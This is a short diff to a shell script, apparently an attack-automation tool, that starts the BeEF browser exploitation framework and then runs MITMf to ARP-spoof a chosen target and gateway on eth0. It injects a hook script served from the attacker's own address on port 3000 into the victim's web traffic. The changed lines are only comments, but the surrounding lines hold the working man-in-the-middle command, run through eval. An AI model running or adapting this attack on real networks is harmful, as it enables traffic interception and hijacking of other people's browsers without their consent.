@@ -23,7 +23,7 @@ echo "Your IP is $yours, Router is $router, Target is $target"
 
 echo "Staring BeEF ... "
 cd /usr/share/beef-xss; ./beef > /root/Desktop/boutput.txt
-
+#BeEf output in boutput.txt
 #parse obutput.txt
 r=Hook 
 wait
@@ -40,6 +40,7 @@ xdg-open $xvar
 
 #here we would pass our site/target to mitmf
 echo "Starting MITMf ... "
+#mitmf output in moutput.txt
 mvar="mitmf --spoof --arp -i eth0 --gateway $router --target $target --inject --js-url http://$yours:3000/hook.js > /root/Desktop/moutput.txt"
 echo $mvar
 eval $mvar
